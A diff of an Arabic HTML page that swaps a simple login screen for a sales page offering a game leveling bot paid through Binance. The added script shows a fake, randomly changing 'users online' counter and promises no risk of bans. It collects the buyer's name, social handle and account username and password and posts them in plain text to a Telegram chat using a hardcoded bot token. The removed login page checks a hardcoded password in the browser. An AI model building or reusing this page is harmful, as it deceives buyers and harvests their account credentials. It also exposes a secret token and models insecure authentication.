@@ -1,132 +1,252 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title> 1تسجيل الدخول</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      font-family: 'Cairo', sans-serif;
-      background: linear-gradient(135deg,#000000,#1a0000,#000000);
-      margin: 0;
-    }
-    .login-container {
-      background: #111;
-      padding: 1.5rem;
-      border-radius: 12px;
-      box-shadow: 0 0 25px rgba(255,0,0,0.25);
-      width: 300px;
-      text-align: center;
-      border: 1px solid #330000;
-    }
-    h2 {
-      margin-bottom: 1rem;
-      font-weight: 600;
-      color: #ff3333;
-      font-size: 18px;
-    }
-    .input-group {
-      position: relative;
-      margin-bottom: 0.8rem;
-    }
-    .input-group input {
-      width: 100%;
-      height: 34px;
-      padding: 5px 32px 5px 8px;
-      border: 1px solid #333;
-      border-radius: 6px;
-      outline: none;
-      background: #1c1c1c;
-      color: #fff;
-      font-size: 13px;
-      box-sizing: border-box;
-    }
-    .input-group input:focus {
-      border-color: #ff3333;
-      box-shadow: 0 0 5px rgba(255,0,0,0.4);
-    }
-    .input-group i {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: #888;
-      font-size: 13px;
-      pointer-events: none;
-    }
-    .btn {
-      width: 100%;
-      padding: 9px;
-      background: #cc0000;
-      border: none;
-      border-radius: 6px;
-      color: #fff;
-      font-size: 14px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: 0.3s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-    }
-    .btn:hover {
-      background: #ff0000;
-      box-shadow: 0 0 8px rgba(255,0,0,0.4);
-    }
-    .error-message {
-      margin-top: 8px;
-      color: #ff5555;
-      font-size: 12px;
-      display: none;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>D5M TEAM LVL FF - السيطرة المطلقة</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+<style>
+body {
+    margin:0;
+    font-family:'Orbitron', sans-serif;
+    background: linear-gradient(270deg, #0a0f2a, #00152d, #0a0f2a);
+    background-size: 600% 600%;
+    animation: gradientBG 20s ease infinite;
+    color:#fff;
+    display:flex;
+    justify-content:center;
+    padding:20px;
+}
+
+@keyframes gradientBG {
+    0%{background-position:0% 50%;}
+    50%{background-position:100% 50%;}
+    100%{background-position:0% 50%;}
+}
+
+.container{
+    width:100%;
+    max-width:1100px;
+}
+
+h1{
+    font-size:64px;
+    text-align:center;
+    text-shadow: 0 0 20px #00f0ff, 0 0 40px #00f0ff;
+    margin-bottom:50px;
+}
+
+/* Neon Animated Card */
+@keyframes neonBorder {
+    0%{box-shadow: 0 0 15px #00f0ff, 0 0 30px #00f0ff inset;}
+    25%{box-shadow: 0 0 20px #00ffea, 0 0 40px #00ffea inset;}
+    50%{box-shadow: 0 0 25px #ff00ff, 0 0 50px #ff00ff inset;}
+    75%{box-shadow: 0 0 20px #ffea00, 0 0 40px #ffea00 inset;}
+    100%{box-shadow: 0 0 15px #00f0ff, 0 0 30px #00f0ff inset;}
+}
+
+.neon-card{
+    background: rgba(10,15,50,0.85);
+    border-radius:25px;
+    padding:25px;
+    margin:20px 0;
+    border: 2px solid #00f0ff;
+    animation: neonBorder 4s linear infinite;
+    transition: all 0.3s ease;
+}
+.neon-card:hover{
+    transform: scale(1.02);
+}
+
+/* عداد المتصلين */
+#onlineCount{
+    font-size:36px;
+    font-weight:bold;
+    color:#00ffea;
+    text-align:center;
+    text-shadow: 0 0 20px #00ffea, 0 0 40px #00ffea;
+}
+
+/* المميزات */
+.feature-list{
+    list-style:none;
+    padding:0;
+}
+.feature-list li{
+    margin:10px 0;
+    font-size:18px;
+    padding-left:30px;
+    position:relative;
+}
+.feature-list li::before{
+    content:"⭐";
+    position:absolute;
+    left:0;
+}
+
+/* الإدخالات */
+input, button{
+    border:none;
+    border-radius:12px;
+    font-size:16px;
+    padding:14px;
+    margin:10px 0;
+    width:100%;
+}
+
+input{
+    background: rgba(0,21,45,0.8);
+    color:#fff;
+}
+
+button{
+    cursor:pointer;
+    transition:0.3s;
+}
+
+.btn-primary{
+    background:#00f0ff;
+    color:#00152d;
+    font-weight:bold;
+    box-shadow:0 0 8px #00f0ff;
+    padding:15px 30px;
+    margin:5px 0;
+}
+.btn-primary:hover{
+    box-shadow:0 0 35px #00f0ff; 
+    transform:scale(1.05);
+}
+
+.footer{
+    margin-top:30px;
+    font-size:14px;
+    color:#88f;
+    text-align:center;
+}
+
+@media(max-width:768px){
+    h1{font-size:48px;}
+    .neon-card{font-size:16px; padding:20px;}
+    #onlineCount{font-size:28px;}
+}
+</style>
 </head>
 <body>
-  <div class="login-container">
-    <h2>تسجيل الدخول</h2>
-    <form onsubmit="return login(event)">
-      <div class="input-group">
-        <input type="text" id="username" placeholder="اسم المستخدم" required>
-        <i class="fa fa-user"></i>
-      </div>
-      <div class="input-group">
-        <input type="password" id="password" placeholder="كلمة المرور" required>
-        <i class="fa fa-lock"></i>
-      </div>
-      <button type="submit" class="btn">
-        دخول <i class="fa fa-arrow-right"></i>
-      </button>
-      <div id="error" class="error-message">❌  0اسم المستخدم أو كلمة المرور غير صحيحة</div>
-    </form>
-  </div>
 
-  <script>
-    function login(e) {
-      e.preventDefault();
-      const user = document.getElementById("username").value.trim();
-      const pass = document.getElementById("password").value.trim();
-      const errorBox = document.getElementById("error");
+<div class="container">
 
-      if (user === "SASUKE" && pass === "X7") {
-        window.location.href = "player.html";
-      } else {
-        errorBox.style.display = "block";
-      }
+<h1>D5M TEAM LVL FF</h1>
+
+<!-- عداد المتصلين -->
+<div class="neon-card">
+<h2>👥 عدد الأشخاص المتصلين الآن</h2>
+<p id="onlineCount">0</p>
+</div>
+
+<!-- مميزات البوت -->
+<div class="neon-card">
+<h2>⭐ مميزات بوت D5M TEAM</h2>
+<ul class="feature-list">
+<li>تقدم فوري ومستمر بدون الحاجة للاتصال بالإنترنت.</li>
+<li>آمنة 100%، لا خطر من الحظر أو تعليق الحساب.</li>
+<li>يحافظ على جميع رتبك ومستواك مهما طالت مدة الاستخدام.</li>
+<li>واجهة واحدة سهلة الاستخدام، كل شيء بضغطة زر.</li>
+<li>إشعارات فورية لكل تقدم في اللعبة.</li>
+<li>تحكم كامل وسريع في البوت: رفع مستويات، ضبط السرعة والمهارة.</li>
+<li>تصميم أنيق ومرتب يركز على كل نقطة مهمة للمشتري.</li>
+</ul>
+</div>
+
+<!-- بيانات المستخدم -->
+<div class="neon-card">
+<h2>✏️ املأ بياناتك</h2>
+<input type="text" id="fullname" placeholder="الاسم الكامل">
+<input type="text" id="platform" placeholder="منصة التواصل (Instagram/Telegram)">
+<input type="text" id="socialUser" placeholder="يوزر التواصل">
+<input type="text" id="botUser" placeholder="اسم المستخدم للبوت">
+<input type="password" id="botPass" placeholder="كلمة المرور للبوت">
+</div>
+
+<!-- الدفع -->
+<div class="neon-card">
+<h2>💰 الدفع عبر Binance</h2>
+<button class="btn-primary" id="buyBtn">اشترِ الآن</button>
+<p style="font-size:14px; color:#88f;">بعد الدفع، قم برفع إثبات الدفع هنا لإرسال طلبك للمطور.</p>
+<input type="file" id="proofFile" accept="image/*">
+<button class="btn-primary" id="sendProofBtn">إرسال إثبات الدفع</button>
+</div>
+
+<!-- تواصل مباشر -->
+<div class="neon-card">
+<h2>📩 تواصل مباشر مع المطور</h2>
+<button class="btn-primary" onclick="window.open('https://t.me/d5mxx','_blank')">Telegram Direct</button>
+<button class="btn-primary" onclick="window.open('https://www.instagram.com/d5mxh','_blank')">Instagram Direct</button>
+</div>
+
+<footer class="footer">© جميع الحقوق محفوظة – ROJILVLFF</footer>
+
+</div>
+
+<script>
+const BOT_TOKEN="7710816011:AAHV5ybc-Hwet8IdL1TwbJfWYhmsxxG2T_8";
+const ADMIN_ID="6251932709";
+const PAYMENT_LINK="https://s.binance.com/MLrHuEhu";
+
+// عداد متصلين وهمي متغير
+let onlineCount = Math.floor(Math.random()*200)+50;
+function updateOnlineCount(){
+    let change = Math.floor(Math.random()*6)+2;
+    onlineCount += Math.random()<0.6? change : -change;
+    if(onlineCount<50) onlineCount=50;
+    if(onlineCount>1000) onlineCount=1000;
+    document.getElementById('onlineCount').innerText=onlineCount;
+}
+setInterval(updateOnlineCount,3000);
+
+// فتح رابط الدفع فقط
+document.getElementById('buyBtn').onclick = ()=>{
+    window.open(PAYMENT_LINK, "_blank");
+    alert("✅ تم توجيهك مباشرة إلى صفحة الدفع على Binance.\nبعد الدفع، يرجى رفع إثبات الدفع هنا.");
+};
+
+// إرسال إثبات الدفع للبوت فقط بعد رفع الصورة
+document.getElementById('sendProofBtn').onclick = ()=>{
+    const fileInput = document.getElementById('proofFile');
+    const fullname=document.getElementById('fullname').value;
+    const platform=document.getElementById('platform').value;
+    const socialUser=document.getElementById('socialUser').value;
+    const botUser=document.getElementById('botUser').value;
+    const botPass=document.getElementById('botPass').value;
+
+    if(!fileInput.files.length){
+        alert("❌ الرجاء رفع صورة إثبات الدفع بعد الانتهاء من الدفع على Binance");
+        return;
+    }
+    if(!fullname||!platform||!socialUser||!botUser||!botPass){
+        alert("❌ الرجاء تعبئة كل الحقول قبل الإرسال");
+        return;
     }
 
-    // إخفاء رسالة الخطأ عند التعديل على أي حقل
-    document.querySelectorAll("#username, #password").forEach(input => {
-      input.addEventListener("input", () => {
-        document.getElementById("error").style.display = "none";
-      });
-    });
-  </script>
+    const caption=`🚨 طلب جديد 🚨
+👤 الاسم: ${fullname}
+🌐 المنصة: ${platform}
+🆔 يوزر التواصل: ${socialUser}
+🔑 يوزر البوت: ${botUser}
+🔒 كلمة المرور: ${botPass}`;
+
+    const formData = new FormData();
+    formData.append("chat_id", ADMIN_ID);
+    formData.append("caption", caption);
+    formData.append("photo", fileInput.files[0]);
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+        method:"POST",
+        body: formData
+    })
+    .then(res => res.ok ? alert("✅ سيتم التحقق من معلوماتك وسيتم التواصل معك تلقائيٱ") : alert("❌ فشل الإرسال"))
+    .catch(err => alert("❌ خطأ في الإرسال: "+err));
+};
+</script>
+
 </body>
 </html>
